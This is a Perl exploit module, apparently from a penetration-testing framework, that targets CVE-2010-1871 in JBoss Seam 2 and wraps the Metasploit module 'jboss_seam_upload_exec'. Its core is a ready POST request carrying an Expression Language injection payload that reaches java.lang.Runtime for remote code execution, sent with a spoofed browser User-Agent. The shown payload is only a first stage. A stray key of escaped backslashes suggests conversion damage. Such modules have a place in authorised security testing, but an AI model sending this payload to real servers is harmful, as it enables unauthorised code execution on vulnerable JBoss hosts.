package JBOSS::MSF::JbossSeamUploadExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "JbossSeamUploadExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "\\\\\\\\\\\\\\\\" => "/",
  "CVE" => "CVE-2010-1871",
  "DESCRIPTION" => "

            Versions of the JBoss Seam 2 framework < 2.2.1CR2 fails to properly

            sanitize inputs to some JBoss Expression Language expressions.  As a

            result, attackers can gain remote code execution through the

            application server.  This module leverages RCE to upload and execute

            a given payload.



            Versions of the JBoss application server (AS) admin-console are

            known to be vulnerable to this exploit, without requiring authentication.

            Tested against JBoss AS 5 and 6, running on Linux with JDKs 6 and 7.



            This module provides a more efficient method of exploitation - it

            does not loop to find desired Java classes and methods.

        ",
  "MSF_MODULE" => "jboss_seam_upload_exec",
  "REFERENCES" => [
    "https://bugzilla.redhat.com/show_bug.cgi?id=615956",
    "http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html",
    "http://archives.neohapsis.com/archives/bugtraq/2013-05/0117.html",
  ],
  "TITLE" => "JBoss Seam 2 File Upload and Execute",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => 'actionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName(\'java.lang.Runtime\').getDeclaredMethod(\'getRuntime\')}',
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
